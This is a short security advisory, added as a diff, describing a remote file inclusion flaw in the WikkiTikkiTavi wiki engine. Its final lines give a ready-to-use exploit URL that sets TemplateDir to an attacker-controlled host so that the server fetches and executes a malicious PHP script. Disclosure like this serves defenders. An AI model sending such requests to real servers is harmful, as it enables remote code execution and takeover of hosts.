@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/3946/info
+
+WikkiTikkiTavi is a freely available engine for running a Wiki site. Wiki sites are web communities which are based on the idea that every webpage is editable by users of the website. WikkiTikkiTavi is back-ended by a MySQL database and runs on most Linux and Unix variants, as well as Microsoft Windows NT/2000 operating systems.
+
+WikkiTikkiTavi permits remote file including. As a result, a remote attacker may include an arbitrary file located on a remote host. This may be exploited via a malicious web request. If this file is a PHP script, it will be executed on the host running the vulnerable software with the privileges of the webserver.
+
+The attacker may use this as an opportunity to gain local access on the host running the vulnerable software.
+
+The following URL is sufficient to exploit this issue:
+
+http://some.host/wikihome/action/conflict.php?TemplateDir=http://my.host/
+
+where conflict.php is the name of the malicious attacker-supplied script. 
